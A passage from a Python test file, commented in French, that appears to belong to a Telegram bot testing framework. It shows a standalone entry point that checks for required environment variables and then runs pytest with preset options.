    """Fonction principale pour exécuter les tests en standalone"""
    import sys
    
    print("🤖 Framework de Test Telegram Bot")
    print("=" * 50)
    
    # Vérifier les variables d'environnement
    required_vars = ["TELEGRAM_BOT_TOKEN", "TELEGRAM_BOT_USERNAME", "TELEGRAM_TEST_CHAT_ID"]
    missing_vars = [var for var in required_vars if not os.getenv(var)]
    
    if missing_vars:
        print(f"❌ Variables d'environnement manquantes: {', '.join(missing_vars)}")
        print("Veuillez créer un fichier .env avec ces variables.")
        return 1
    
    # Configuration par défaut
    pytest_args = [
        __file__,
        "-v",
        "--tb=short",
        "-x",  # Arrêter au premier échec
        "--maxfail=5",  # Maximum 5 échecs
    ]
    
    # Ajouter des arguments basés sur les variables d'environnement
    if not RUN_UI_TESTS:
        pytest_args.extend(["-m", "not ui"])
    
    # Exécuter pytest
    exit_code = pytest.main(pytest_args)
    
    print(f"\n✅ Tests terminés avec le code de sortie: {exit_code}")
    return exit_code


if __name__ == "__main__":
    exit(main())